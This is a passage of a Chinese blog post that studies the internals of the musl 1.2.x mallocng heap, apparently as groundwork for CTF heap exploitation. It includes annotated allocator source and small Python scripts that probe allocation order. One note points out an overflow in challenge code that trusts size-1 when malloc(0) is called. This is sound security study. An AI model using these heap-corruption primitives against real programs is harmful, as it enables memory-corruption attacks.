class="title">meta_area_tail</span>;</span> <span class="comment">//分配区头尾指针</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span>   <span class="comment">//活动的meta</span></span><br><span class="line">    <span class="keyword">size_t</span> usage_by_class[<span class="number">48</span>]; <span class="comment">//这个大小级别使用了多少内存</span></span><br><span class="line">    <span class="keyword">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">uint8_t</span> seq;</span><br><span class="line">    <span class="keyword">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> <span class="title">ctx</span>;</span></span><br></pre></td></tr></table></div></figure>

<p>总的来说，数据结构大致如下所示</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203172053962.png" alt="img"></p>

        <h2 id="2-维护方式-1"   >
          <a href="#2-维护方式-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-维护方式-1" class="headerlink" title="2.维护方式"></a>2.维护方式</h2>
      <p>使用<code>freed_mask</code>和<code>avail_mask</code>来确定，如下图所示，在<code>active[2]</code>(即size在0x1d~0x2c的chunk)中现在有</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171413463.png" alt="image-20220317141333259"></p>
<p>我们将active[2]中<code>avail_mask</code>置1的chunk都申请出来之后，即代表这个group无法接着为我们的申请提供chunk的话，比如这里就是需要申请出chunk0~chunk9，然后再申请的话就会进行判断</p>
<ul>
<li>如果该group中存在被free的chunk，即<code>freed_mask</code>中置1的chunk，那么就返回该chunk，这里也存在一个顺序问题，不会管是先释放还是后释放的，只会从上到下进行分配，如下代码</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">	free(i)</span><br><span class="line"></span><br><span class="line">dbg()    </span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>第一次<code>dbg()</code>断点的地方先申请8个chunk，那么现在在该group的<code>avail_mask</code>中应该为<code>1100000000</code> 而<code>freed_mask</code>应该为<code>1111111</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171434757.png" alt="image-20220317143430652"></p>
<p>我们接着申请两个Chunk，在第二次断点处，其<code>avail_mask</code>应该为0，而<code>freed_mask</code>不变</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171438716.png"></p>
<p>这时候再申请一个chunk，即可申请出group中从上往下数首个被free的chunk，这时<code>freed_mask</code>被清空，<code>avail_mask</code>依据<code>freed_mask</code>进行重置</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171442484.png" alt="image-20220317144243283"></p>
<p>其实总而言之就是当耗尽group中的avail_mask对应的可用chunk之后，再申请就会检测该group中是否存在被free的chunk，存在就会对被free的chunk进行处理，归到avail中，相应的avail_mask和freed_mask发生变化。</p>
<p>而如果我们改变释放顺序，依然申请出首个可用chunk，和释放顺序无关</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">7</span>):</span><br><span class="line">	free(i)</span><br><span class="line">dbg()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">pause()</span><br><span class="line">add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">edit(<span class="number">10</span>,<span class="number">0x10</span>,p8(<span class="number">0x11</span>)*<span class="number">0x10</span>)</span><br><span class="line">pause()</span><br></pre></td></tr></table></div></figure>

<p>如下效果</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171447956.png" alt="image-20220317144709749"></p>
<ul>
<li>当申请到该group中无可用chunk时，尝试从该size的meta队列中的其他meta对应的group来申请chunk。</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i+<span class="number">11</span>,<span class="number">0x10</span>,p8(i+<span class="number">11</span>)*<span class="number">0x10</span>)</span><br><span class="line">dbg()</span><br></pre></td></tr></table></div></figure>

<p>如下图所示，我们在申请出另外一个meta-group(meta1)之后，free掉第一个meta-group(meta0)中的Chunk，然后当我们消耗完meta1中的空间之后，再申请chunk的话会检测该size的meta队列，试图从中申请chunk出来，如下图即从meta0中申请出我们刚刚释放的Chunk。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171531940.png" alt="image-20220317153130762"></p>
<ul>
<li>当该size的meta队列中无avail的chunk无free的chunk时，就会再分配一个<code>meta-group</code>来进行再分配</li>
</ul>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">	add_malloc(<span class="number">0x2c</span>)</span><br><span class="line">	edit(i,<span class="number">0x10</span>,p8(i)*<span class="number">0x10</span>)</span><br><span class="line">dbg()</span><br></pre></td></tr></table></div></figure>

<p>原来的group已经不可用了，所以新分配了一个group</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203171449585.png" alt="image-20220317144959413"></p>

        <h2 id="3-关键函数-1"   >
          <a href="#3-关键函数-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-关键函数-1" class="headerlink" title="3.关键函数"></a>3.关键函数</h2>
      
        <h3 id="1-malloc"   >
          <a href="#1-malloc" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-malloc" class="headerlink" title="(1)malloc"></a>(1)malloc</h3>
      <p>参考：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/246929#h2-3" >musl-1.2.x堆部分源码分析 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/253566#h3-4" >从musl libc 1.1.24到1.2.2 学习pwn姿势 - 安全客，安全资讯平台 (anquanke.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1  /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">malloc</span><span class="params">(<span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (size_overflows(n)) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//是否超过申请的最大值，这个最大值不知道多少</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    static inline int size_overflows(size_t n)</span></span><br><span class="line"><span class="comment">    &#123;</span></span><br><span class="line"><span class="comment">        if (n &gt;= SIZE_MAX/2 - 4096) &#123;</span></span><br><span class="line"><span class="comment">            errno = ENOMEM;</span></span><br><span class="line"><span class="comment">            return 1;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        return 0;</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span>;</span></span><br><span class="line">	<span class="keyword">uint32_t</span> mask, first;</span><br><span class="line">	<span class="keyword">int</span> sc;</span><br><span class="line">	<span class="keyword">int</span> idx;</span><br><span class="line">	<span class="keyword">int</span> ctr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//mmap分配  #define MMAP_THRESHOLD 131052(0x1FFEC)</span></span><br><span class="line">	<span class="keyword">if</span> (n &gt;= MMAP_THRESHOLD) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> needed = n + IB + UNIT;</span><br><span class="line">		<span class="keyword">void</span> *p = mmap(<span class="number">0</span>, needed, PROT_READ|PROT_WRITE,</span><br><span class="line">			MAP_PRIVATE|MAP_ANON, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">		<span class="keyword">if</span> (p==MAP_FAILED) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		wrlock();</span><br><span class="line">		step_seq();</span><br><span class="line">		g = alloc_meta();</span><br><span class="line">		<span class="keyword">if</span> (!g) &#123;</span><br><span class="line">			unlock();</span><br><span class="line">			munmap(p, needed);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        <span class="comment">//记录分配信息</span></span><br><span class="line">		g-&gt;mem = p;</span><br><span class="line">		g-&gt;mem-&gt;meta = g;</span><br><span class="line">		g-&gt;last_idx = <span class="number">0</span>;</span><br><span class="line">		g-&gt;freeable = <span class="number">1</span>;</span><br><span class="line">		g-&gt;sizeclass = <span class="number">63</span>;<span class="comment">//meta的sizeclass为63代表mmap分配</span></span><br><span class="line">		g-&gt;maplen = (needed+<span class="number">4095</span>)/<span class="number">4096</span>;</span><br><span class="line">		g-&gt;avail_mask = g-&gt;freed_mask = <span class="number">0</span>;</span><br><span class="line">		<span class="comment">// use a global counter to cycle offset in</span></span><br><span class="line">		<span class="comment">// individually-mmapped allocations.</span></span><br><span class="line">        <span class="comment">//记录分配个数</span></span><br><span class="line">		ctx.mmap_counter++;</span><br><span class="line">		idx = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//寻找size对应的meta，ctx.active[sc]</span></span><br><span class="line">	sc = size_to_class(n);</span><br><span class="line">	rdlock();</span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// use coarse size classes initially when there are not yet</span></span><br><span class="line">	<span class="comment">// any groups of desired size. this allows counts of 2 or 3</span></span><br><span class="line">	<span class="comment">// to be allocated at first rather than having to start with</span></span><br><span class="line">	<span class="comment">// 7 or 5, the min counts for even size classes.</span></span><br><span class="line">    <span class="comment">//对应size的meta为空且4=&lt;sc&lt;=32且不等于6且为偶数并且该sc没有正在使用的chunk</span></span><br><span class="line">    <span class="comment">//那么申请的chunk就会从sc+1开始申请，比如申请0x8c，对应的sc应该是8，但是由于</span></span><br><span class="line">    <span class="comment">//满足这个条件，sc为8的meta没有正在使用的chunk，对应就会从sc+1=9处开始申请</span></span><br><span class="line">	<span class="keyword">if</span> (!g &amp;&amp; sc&gt;=<span class="number">4</span> &amp;&amp; sc&lt;<span class="number">32</span> &amp;&amp; sc!=<span class="number">6</span> &amp;&amp; !(sc&amp;<span class="number">1</span>) &amp;&amp; !ctx.usage_by_class[sc]) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> usage = ctx.usage_by_class[sc|<span class="number">1</span>];</span><br><span class="line">		<span class="comment">// if a new group may be allocated, count it toward</span></span><br><span class="line">		<span class="comment">// usage in deciding if we can use coarse class.</span></span><br><span class="line">		<span class="keyword">if</span> (!ctx.active[sc|<span class="number">1</span>] || (!ctx.active[sc|<span class="number">1</span>]-&gt;avail_mask</span><br><span class="line">		    &amp;&amp; !ctx.active[sc|<span class="number">1</span>]-&gt;freed_mask))</span><br><span class="line">			usage += <span class="number">3</span>;</span><br><span class="line">		<span class="keyword">if</span> (usage &lt;= <span class="number">12</span>)</span><br><span class="line">			sc |= <span class="number">1</span>;</span><br><span class="line">		g = ctx.active[sc];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//取到avail_mask最低位的1，置零之后计算idx</span></span><br><span class="line">    <span class="comment">//根据idx从group中寻找可用chunk</span></span><br><span class="line">	<span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">//meta中的可用内存的bitmap, 如果g为0那么就设为0, 表示没有可用chunk</span></span><br><span class="line">		mask = g ? g-&gt;avail_mask : <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//找到avail_mask的bit中第一个为1的bit</span></span><br><span class="line">		first = mask&amp;-mask;</span><br><span class="line">        <span class="comment">//如果没找到就停止</span></span><br><span class="line">		<span class="keyword">if</span> (!first) <span class="keyword">break</span>;</span><br><span class="line">        <span class="comment">//设置avail_mask中first对应的bit为0</span></span><br><span class="line">        <span class="comment">//下面是锁机制，不太懂</span></span><br><span class="line">		<span class="keyword">if</span> (RDLOCK_IS_EXCLUSIVE || !MT)</span><br><span class="line">			g-&gt;avail_mask = mask-first;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (a_cas(&amp;g-&gt;avail_mask, mask, mask-first)!=mask)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">        <span class="comment">//找到之后设置avail_mask之后转为idx, 结束</span></span><br><span class="line">		idx = a_ctz_32(first);</span><br><span class="line">		<span class="keyword">goto</span> success;</span><br><span class="line">	&#125;</span><br><span class="line">	upgradelock();</span><br><span class="line"></span><br><span class="line">	idx = alloc_slot(sc, n);</span><br><span class="line">	<span class="keyword">if</span> (idx &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		unlock();</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//找到对应meta</span></span><br><span class="line">	g = ctx.active[sc];</span><br><span class="line"></span><br><span class="line">success:</span><br><span class="line">	ctr = ctx.mmap_counter;</span><br><span class="line">	unlock();</span><br><span class="line">    <span class="comment">//从g中分配第idx个chunk, 大小为n</span></span><br><span class="line">	<span class="keyword">return</span> enframe(g, idx, n, ctr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li><p>判断有无超过mmap的阈值, 如果超过就mmap分配</p>
</li>
<li><p>如果没有超过, size转sc之后, 通过ctx.active[sc]找到对应的meta队列, 尝试从队列中首个meta里分配chunk</p>
</li>
<li><p>如果这个队列为空, 或者这个meta的avail_mask里面没有合适的chunk, 那就调用alloc_slot()获取chunk</p>
</li>
<li><p>找到group与idx之后通过enframe()分配出这个chunk</p>
</li>
</ul>

        <h4 id="🔺注："   >
          <a href="#🔺注：" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺注：" class="headerlink" title="🔺注："></a>🔺注：</h4>
      <p>需要注意的是，并没有对size为0进行限制，所以我们也可以申请size为0的Chunk，万一如下代码所示</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">size = readint(<span class="string">&quot;size?&quot;</span>, a2);</span><br><span class="line">*(_QWORD *)v5 = <span class="built_in">malloc</span>(size);</span><br><span class="line">v5[<span class="number">2</span>] = size - <span class="number">1</span>;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Contnet?&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> readn(*(_QWORD *)v5, v5[<span class="number">2</span>]);</span><br></pre></td></tr></table></div></figure>

<p>那么size为0就可以无限溢出了啊</p>

        <h4 id="①alloc-slot"   >
          <a href="#①alloc-slot" class="heading-link"><i class="fas fa-link"></i></a><a href="#①alloc-slot" class="headerlink" title="①alloc_slot"></a>①alloc_slot</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">alloc_slot</span><span class="params">(<span class="keyword">int</span> sc, <span class="keyword">size_t</span> req)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//尝试在该size的meta对应的active[sc]队列内部分配chunk</span></span><br><span class="line">	<span class="keyword">uint32_t</span> first = try_avail(&amp;ctx.active[sc]);</span><br><span class="line">	<span class="keyword">if</span> (first) <span class="keyword">return</span> a_ctz_32(first);<span class="comment">//分配成功直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//如果该size的meta对应的active[sc]队列中没有合适的avail_mask</span></span><br><span class="line">    <span class="comment">//和freed_mask对应的chunk，那么就再分配一个meta-group，插入队列中</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">g</span> =</span> alloc_group(sc, req);</span><br><span class="line">	<span class="keyword">if</span> (!g) <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	g-&gt;avail_mask--;</span><br><span class="line">    <span class="comment">//新分配的g入队</span></span><br><span class="line">	<span class="built_in">queue</span>(&amp;ctx.active[sc], g);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<ul>
<li>首先会通过<code>try_avail()</code>在以下位置寻找可用的chunk,<ul>
<li>ctx.active[sc]的meta-group的freed_mask中</li>
<li>队列中其他meta-group的avail_mask和freed_mask中</li>
</ul>
</li>
<li>如果失败,或者这个队列本来就空, 那么就会调用<code>alloc_group()</code>直接分配一个新的meta与对应的group，然后调用queue插入ctx.avtive[sc]这个队列中</li>
</ul>

        <h4 id="②try-avail"   >
          <a href="#②try-avail" class="heading-link"><i class="fas fa-link"></i></a><a href="#②try-avail" class="headerlink" title="②try_avail"></a>②try_avail</h4>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.1 /src/malloc/mallocng/malloc.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">uint32_t</span> <span class="title">try_avail</span><span class="params">(struct meta **pm)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">m</span> =</span> *pm;</span><br><span class="line">    <span class="keyword">uint32_t</span> first;</span><br><span class="line">    <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;<span class="comment">//如果ctx.active[sc]==NULL, 即该队列为空，直接返回</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//ctx.active[sc]对应的meta-group的avail_mask中无可用chunk</span></span><br><span class="line">    <span class="keyword">uint32_t</span> mask = m-&gt;avail_mask;</span><br><span class="line">    <span class="keyword">if</span> (!mask) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//ctx.active[sc]对应的meta-group的freed_mask中也没有chunk时</span></span><br><span class="line">        <span class="comment">//代表都在使用中，从队列中弹出该meta-group</span></span><br><span class="line">        <span class="keyword">if</span> (!m-&gt;freed_mask) &#123;</span><br><span class="line">            dequeue(pm, m);</span><br><span class="line">            m = *pm;</span><br><span class="line">            <span class="keyword">if</span> (!m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//获取队列中下一个meta-group</span></span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">        &#125;</span><br><span class="line">		</span><br><span class="line">        <span class="comment">//如果这个meta-group中所有的chunk都被释放了, 那么就再下一个meta-group</span></span><br><span class="line">        <span class="comment">//即不从下一个全free或者没有申请chunk的meta-group中申请chunk</span></span><br><span class="line">        mask = m-&gt;freed_mask;</span><br><span class="line">        <span class="comment">// skip fully-free group unless it&#x27;s the only one</span></span><br><span class="line">        <span class="comment">// or it&#x27;s a permanently non-freeable group</span></span><br><span class="line">        <span class="keyword">if</span> (mask == (<span class="number">2u</span>&lt;&lt;m-&gt;last_idx)<span class="number">-1</span> &amp;&amp; m-&gt;freeable) &#123;</span><br><span class="line">            m = m-&gt;next;</span><br><span class="line">            *pm = m;</span><br><span class="line">            mask = m-&gt;freed_mask;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//没太看懂想干啥</span></span><br><span class="line">        <span class="comment">// activate more slots in a not-fully-active group</span></span><br><span class="line">        <span class="comment">// if needed, but only as a last resort. prefer using</span></span><br><span class="line">        <span class="comment">// any other group with free slots. this avoids</span></span><br><span class="line">        <span class="comment">// touching &amp; dirtying as-yet-unused pages.</span></span><br><span class="line">        <span class="keyword">if</span> (!(mask &amp; ((<span class="number">2u</span>&lt;&lt;m-&gt;mem-&gt;active_idx)<span class="number">-1</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (m-&gt;next != m) &#123;</span><br><span class="line">                m = m-&gt;next;</span><br><span class="line">                *pm = m;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> cnt = m-&gt;mem-&gt;active_idx + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">int</span> size = size_classes[m-&gt;sizeclass]*UNIT;</span><br><span class="line">                <span class="keyword">int</span> span = UNIT + size*cnt;</span><br><span class="line">                <span class="comment">// activate up to next 4k boundary</span></span><br><span class="line">                <span class="keyword">while</span> ((span^(span+size<span class="number">-1</span>)) &lt; <span class="number">4096</span>) &#123;</span><br><span class="line">                    cnt++;</span><br><span class="line">                    span += size;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cnt &gt; m-&gt;last_idx+<span class="number">1</span>)</span><br><span class="line">                    cnt = m-&gt;last_idx+<span class="number">1</span>;</span><br><span class="line">                m-&gt;mem-&gt;active_idx = cnt<span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//重新设置这个meta-group，freed_mask和avail_mask的设置</span></span><br><span class="line">        mask = activate_group(m);</span><br><span class="line">        <span class="comment">/*其实也就是设置设置一下freed_mask和avail_mask</span></span><br><span class="line"><span class="comment">        static inline uint32_t activate_group(struct meta *m)</span></span><br><span class="line"><span class="comment">        &#123;</span></span><br><span class="line"><span class="comment">            assert(!m-&gt;avail_mask);</span></span><br><span class="line"><span class="comment">            uint32_t mask, act = (2u&lt;&lt;m-&gt;mem-&gt;active_idx)-1;</span></span><br><span class="line"><span class="comment">            do mask = m-&gt;freed_mask;</span></span><br><span class="line"><span class="comment">            while (a_cas(&amp;m-&gt;freed_mask, mask, mask&amp;~act)!=mask);</span></span><br><span class="line"><span class="comment">            return m-&gt;avail_mask = mask &amp; act;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        assert(mask);</span><br><span class="line">        